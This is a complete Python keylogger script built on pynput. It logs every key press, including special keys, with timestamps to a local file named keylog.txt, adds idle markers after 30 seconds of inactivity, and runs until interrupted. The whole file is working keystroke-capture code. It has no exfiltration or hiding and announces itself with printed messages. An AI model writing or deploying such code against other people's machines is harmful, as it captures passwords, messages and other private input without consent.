from pynput import keyboard
import threading
from datetime import datetime
import queue
import time

print("KEYLOGGER FILE LOADED")

# -----------------------------
# Global variables
# -----------------------------
listeners = []                     # list to hold listeners
event_queue = queue.Queue()        # thread-safe event queue
last_event_time = time.time()      # last key press time
idle_threshold = 30                # seconds
log_file = 'keylog.txt'            # log file path


# -----------------------------
# Helper: write to log file
# -----------------------------
def log_to_file(text):
    with open(log_file, "a") as f:
        f.write(text + "\n")
        f.flush()


# -----------------------------
# Key press handler
# -----------------------------
def KeyPressed(key):
    global last_event_time

    timestamp = datetime.now().strftime("%H:%M:%S")
    last_event_time = time.time()

    try:
        # Normal character keys
        char = key.char
        log_entry = f"[{timestamp}] {char}"
        event = f"[{timestamp}] Key: {char}"

    except AttributeError:
        # Special keys (ENTER, SPACE, CTRL, etc.)
        special_key = str(key).split('.')[-1].upper()
        log_entry = f"[{timestamp}] {special_key}"
        event = f"[{timestamp}] Special: [{special_key}]"

    # Log to file
    log_to_file(log_entry)

    # Push event to queue
    event_queue.put(event)


# -----------------------------
# Idle detection thread
# -----------------------------
def idle_check():
    global last_event_time

    while True:
        time.sleep(5)
        if time.time() - last_event_time > idle_threshold:
            timestamp = datetime.now().strftime("%H:%M:%S")
            idle_event = f"[{timestamp}] IDLE: {idle_threshold}s inactive"

            event_queue.put(idle_event)
            log_to_file(idle_event)

            last_event_time = time.time()  # prevent repeated spam


# -----------------------------
# Main execution block
# -----------------------------
if __name__ == "__main__":

    # Start idle monitoring thread
    idle_thread = threading.Thread(target=idle_check, daemon=True)
    idle_thread.start()

    # Start keyboard listener
    kb_listener = keyboard.Listener(on_press=KeyPressed)
    kb_listener.start()
    listeners.append(kb_listener)

    try:
        while True:
            time.sleep(1)   # keeps main thread alive
    except KeyboardInterrupt:
        print("Stopping keylogger...")
    finally:
        for l in listeners:
            l.stop()